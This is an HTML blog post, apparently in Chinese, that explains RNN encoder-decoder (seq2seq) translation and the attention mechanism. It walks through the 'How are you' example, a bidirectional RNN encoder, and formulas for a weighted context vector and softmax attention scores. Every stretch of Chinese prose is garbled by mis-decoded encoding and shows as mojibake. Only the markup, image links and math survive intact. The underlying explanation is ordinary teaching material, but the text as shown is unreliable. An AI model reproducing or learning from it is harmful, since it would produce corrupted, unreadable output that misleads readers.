<p>æ—¢ç„¶è¦æ·±å…¥ç†è§£Transformerï¼Œæˆ‘ä»¬ä¸å¦¨å…ˆå›åˆ°å®ƒè¯ç”Ÿçš„èµ·ç‚¹ï¼šæœºå™¨ç¿»è¯‘é—®é¢˜ã€‚åœ¨Transformerå°šæœªå‡ºç°çš„å¹´ä»£ï¼Œæœºå™¨ç¿»è¯‘çš„ä¸»æµæ¶æ„æ˜¯ä»€ä¹ˆï¼Ÿç†Ÿæ‚‰æ·±åº¦å­¦ä¹ å†å²çš„è¯»è€…ä¸€å®šä¼šæƒ³åˆ°â€”â€”åŸºäºå¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰çš„Seq2Seqæ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯ç»å…¸çš„ç¼–ç å™¨-è§£ç å™¨æ¶æ„ã€‚è®©æˆ‘ä»¬ä»¥è‹±è¯‘ä¸­ä»»åŠ¡ä¸ºä¾‹ï¼Œä¸€æ­¥æ­¥è¿˜åŸå®ƒçš„å·¥ä½œæµç¨‹ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬è¦ç¿»è¯‘â€œHow are youâ€è¿™å¥è¯ã€‚é¦–å…ˆï¼Œè¾“å…¥çš„è‹±æ–‡å•è¯ç»è¿‡Embeddingå±‚è½¬åŒ–ä¸ºè¯å‘é‡åºåˆ—ã€‚è¿™äº›å‘é‡æŒ‰æ—¶é—´é¡ºåºä¾æ¬¡è¾“å…¥å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰ä¸­ï¼Œç»è¿‡å±‚å±‚ä¼ é€’ä¸æ›´æ–°ï¼Œæœ€ç»ˆåœ¨æœ€åä¸€ä¸ªæ—¶é—´æ­¥è¾“å‡ºä¸€ä¸ªéšè—çŠ¶æ€ï¼ˆhidden stateï¼‰ã€‚è¿™ä¸ªçŠ¶æ€è¢«è§†ä¸ºæ•´ä¸ªå¥å­çš„è¯­ä¹‰æµ“ç¼©ï¼Œæ‰¿è½½ç€â€œHow are youâ€çš„å…¨éƒ¨ä¿¡æ¯ã€‚è¿™ä¸ªè¿‡ç¨‹ï¼Œå°±æ˜¯<strong>ç¼–ç å™¨ï¼ˆEncoderï¼‰</strong> çš„æ ¸å¿ƒã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12ef7a3c3748475ba7477c9d5413b6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Rcd3%2BkWdSkV2Ufx5khyTwf8ptwM%3D" alt="c1.jpg" width="100%" loading="lazy"/></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­ç®€åŒ–ä¸ºä¸€ä¸ª <code>RNN Cell</code> çš„æ¨¡å—ï¼Œåœ¨å®é™…ä»»åŠ¡ä¸­é€šå¸¸æ˜¯å¤šå±‚ã€å¤šå•å…ƒçš„å¤æ‚ç»“æ„â€”â€”å¯ä»¥æ˜¯LSTMï¼Œä¹Ÿå¯ä»¥æ˜¯GRUã€‚åƒæœºå™¨ç¿»è¯‘è¿™æ ·å¤æ‚åº¦é«˜ã€åºåˆ—é•¿çš„ä»»åŠ¡ï¼Œå•ä¸€RNNå•å…ƒéš¾ä»¥èƒœä»»ï¼Œå®é™…ä½¿ç”¨çš„æ˜¯å¤šå±‚å †å çš„RNNç½‘ç»œã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c01697f3d5114412abc4c655ea0fca38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=eEnd26nhfJhw3k6uOOdjS7usX0M%3D" alt="c3.jpg" width="100%" loading="lazy"/></p>
<p>å¾—åˆ°è¿™ä¸ªå…¨å±€éšè—çŠ¶æ€åï¼Œ<strong>è§£ç å™¨ï¼ˆDecoderï¼‰</strong> å¼€å§‹å·¥ä½œï¼Œå°†å…¶é€æ­¥è½¬åŒ–ä¸ºç›®æ ‡è¯­è¨€ï¼ˆä¸­æ–‡ï¼‰ã€‚å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè§£ç å™¨åœ¨æ¯ä¸ªæ—¶é—´æ­¥ä¸ä»…æ¥æ”¶ä¸Šä¸€ä¸ªæ—¶é—´æ­¥çš„è¾“å‡ºï¼Œè¿˜ä¼šå°†ç¼–ç å™¨è¾“å‡ºçš„éšè—çŠ¶æ€ä¸å½“å‰è¾“å…¥è¿›è¡Œåˆå¹¶ï¼ˆå›¾ä¸­åœ†åœˆå†…ä¸€ç«–è¡¨ç¤ºæ‹¼æ¥æ“ä½œï¼Œç±»ä¼¼PyTorchä¸­çš„ <code>torch.cat()</code> æˆ– NumPy ä¸­çš„ <code>np.concatenate()</code>ï¼‰ã€‚</p>
<p>è¿™ç§è®¾è®¡åœ¨å½“å¹´è¢«è§†ä¸ºä¸€ç§é‡è¦æ”¹è¿›â€”â€”å®ƒè®©è§£ç è¿‡ç¨‹å§‹ç»ˆâ€œæºå¸¦â€æºå¥å­çš„æ•´ä½“ä¿¡æ¯ï¼Œç†è®ºä¸Šå¯ä»¥åœ¨ç”Ÿæˆé•¿åºåˆ—æ—¶ç¼“è§£ä¿¡æ¯è¡°å‡é—®é¢˜ã€‚å°¤å…¶åœ¨é•¿å¥å­ç¿»è¯‘ä¸­ï¼Œè¿™æ ·åšæœ‰åŠ©äºæ¨¡å‹è®°ä½å¼€å¤´çš„è¯­å¢ƒï¼Œé¿å…ç¿»è¯‘åˆ°å¥æœ«æ—¶é—å¿˜å¼€å¤´çš„å†…å®¹ã€‚</p>
<p>ä¸‹å›¾æ˜¯æ­¤ç½‘ç»œæ¶æ„çš„è®­ç»ƒæµç¨‹ï¼Œå…·ä½“çš„ç»†èŠ‚å°±ä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb2a1170b4e54d06a7f45c544a3f6ee6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=F75j9cbeqZRGcTczvl0vgTSgNrQ%3D" alt="c2.jpg" width="100%" loading="lazy"/></p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œä½ å¯èƒ½ä¼šæƒ³ï¼ŒçœŸçš„æœ‰å¿…è¦æŠŠéšè—çŠ¶æ€å’Œå½“å‰è¾“å…¥åšæ‹¼æ¥å—ï¼Ÿä¾‹å¦‚åœ¨ç”Ÿæˆâ€œä½ å¥½â€æ—¶ï¼Œæˆ‘ä»¬å¼ºè¡Œæ³¨å…¥äº†â€œHow are youâ€çš„å…¨éƒ¨è¯­ä¹‰ã€‚è¿™è™½ç„¶å¸¦æ¥äº†å…¨å±€ä¿¡æ¯ï¼Œå´ä¹Ÿä¸å¯é¿å…åœ°å¼•å…¥äº†<strong>å™ªå£°ä¸å†—ä½™</strong>â€”â€”æ¯•ç«Ÿåœ¨ç¿»è¯‘å½“å‰è¯æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¹¶ä¸éœ€è¦æ•´ä¸ªå¥å­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œåªæ˜¯å…¶ä¸­æŸå‡ ä¸ªç›¸å…³çš„ç‰‡æ®µã€‚</p>
<p>å¦‚æœä½ ä¹Ÿäº§ç”Ÿäº†è¿™æ ·çš„ç–‘é—®ï¼Œé‚£ä¹ˆæ­å–œï¼Œä½ å·²ç»è§¦åŠäº†<strong>æ³¨æ„åŠ›æœºåˆ¶</strong>è¯ç”Ÿçš„å…³é”®åŠ¨æœºã€‚æ²¡é”™ï¼Œæ³¨æ„åŠ›å¹¶ä¸æ˜¯ Transformer çš„ä¸“åˆ©ï¼Œæ—©åœ¨Transformerå‡ºç°ä¹‹å‰ï¼Œå®ƒå°±å·²ç»åœ¨ seq2seq æ¨¡å‹ä¸­ç”¨äºç¼“è§£ä¸Šè¿°é—®é¢˜äº†ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³å¾ˆç›´è§‚ï¼š<strong>è®©æ¨¡å‹å­¦ä¼šåœ¨è§£ç æ¯ä¸ªè¯æ—¶ï¼Œè‡ªä¸»é€‰æ‹©ç¼–ç å™¨è¾“å‡ºçš„å“ªäº›éƒ¨åˆ†æ›´å€¼å¾—å…³æ³¨</strong>ã€‚</p>
<p>é‚£ä¹ˆå…·ä½“æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿä¸‹é¢å°±æ˜¯ä¸€ç§ç»“åˆäº†<strong>åŒå‘ RNN ä¸ç®€æ˜“æ³¨æ„åŠ›</strong>çš„ç¼–ç å™¨-è§£ç å™¨æ¶æ„ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e419faab7944e6b349a951d186a46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=SCu4PwUiI6NFRhIUSmQ2rbpnVcA%3D" alt="c4.jpg" width="100%" loading="lazy"/></p>
<p>æ­¤æ—¶ï¼Œç¼–ç å™¨ä¸å†è¾“å‡ºä¸€ä¸ªä»£è¡¨æ•´ä¸ªå¥å­çš„å•ä¸€éšè—çŠ¶æ€ï¼Œè€Œæ˜¯è®©è¾“å…¥åºåˆ—ä¸­çš„æ¯ä¸ªè¯ç»è¿‡åŒå‘ RNN åï¼Œéƒ½å¯¹åº”ä¸€ä¸ªç‹¬ç«‹çš„è¯­ä¹‰å‘é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚ä¾‹å¦‚ï¼Œâ€œHowâ€ å¯¹åº”<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">O_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ï¼Œâ€œareâ€ å¯¹åº”<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">O_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œä¾æ­¤ç±»æ¨ã€‚è§£ç æ—¶ï¼Œæˆ‘ä»¬ä¸å†å°†æ•´ä¸ªå¥å­ä¿¡æ¯ä¸€è‚¡è„‘å„¿æ³¨å…¥ï¼Œè€Œæ˜¯<strong>åŠ¨æ€è®¡ç®—ä¸€ä¸ªä¸Šä¸‹æ–‡å‘é‡</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">c_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œå®ƒç”±æ‰€æœ‰<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>åŠ æƒæ±‚å’Œå¾—åˆ°ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub><mo>=</mo><munder><mo>âˆ‘</mo><mi>j</mi></munder><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">c_{t} = \sum_{j}q_{(t,j)}O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4638em;vertical-align:-1.4138em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>è¿™é‡Œé¢çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span>å°±æ˜¯æ¯”ä¾‹ç³»æ•°ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æ³¨æ„åŠ›åˆ†æ•°ï¼Œå®ƒè¡¨ç¤ºåœ¨è§£ç ç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>ä¸ªè¯æ—¶ï¼Œç¼–ç å™¨ç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>ä¸ªè¾“å‡ºçš„é‡è¦ç¨‹åº¦ã€‚å®ƒæ˜¯å¦‚ä½•å¾—åˆ°çš„å‘¢ï¼Ÿé€šå¸¸é€šè¿‡å½“å‰è§£ç å™¨çš„éšè—çŠ¶æ€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ä¸æ¯ä¸€ä¸ªç¼–ç å™¨è¾“å‡º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>è¿›è¡ŒåŒ¹é…è®¡ç®—å¾—åˆ°ï¼Œè®¡ç®—æ–¹å¼å¦‚ä¸Šå›¾å³è¾¹æ‰€ç¤ºï¼Œå°±æ˜¯å°†<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ä¸<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>è¾“å…¥åˆ°ä¸€ä¸ªå¯ä»¥è®­ç»ƒçš„ç®€å•å…¨é“¾æ¥ç¥ç»ç½‘ç»œä¸­å»ï¼Œè®¡ç®—å¾—åˆ°åŒ¹é…åˆ†æ•°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œç„¶åå¯¹æ‰€æœ‰<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>è¿›è¡Œsoftmaxå½’ä¸€åŒ–ï¼Œå°±å¯ä»¥å¾—åˆ°æƒé‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ¨¡å‹å°±èƒ½åŠ¨æ€åœ°ä¸ºä¸åŒç¼–ç å™¨è¾“å‡ºåˆ†é…åˆé€‚çš„â€œæ³¨æ„åŠ›â€ã€‚æ¯”å¦‚ç¿»è¯‘â€œä½ â€æ—¶ï¼Œå®ƒå¯èƒ½ç»™â€œyouâ€è¾ƒé«˜çš„æƒé‡ï¼Œè€Œå¿½ç•¥â€œHowâ€å’Œ"are"ã€‚<strong>è¿™ä¸ªæœºåˆ¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å¯å­¦ä¹ çš„â€œä¿¡æ¯ç­›é€‰å™¨â€</strong>ï¼Œè®©è§£ç è¿‡ç¨‹æ—¢ä¿æŒä¸Šä¸‹æ–‡æ„ŸçŸ¥ï¼Œåˆé¿å…æ— å…³å™ªå£°çš„å¹²æ‰°ã€‚</p>
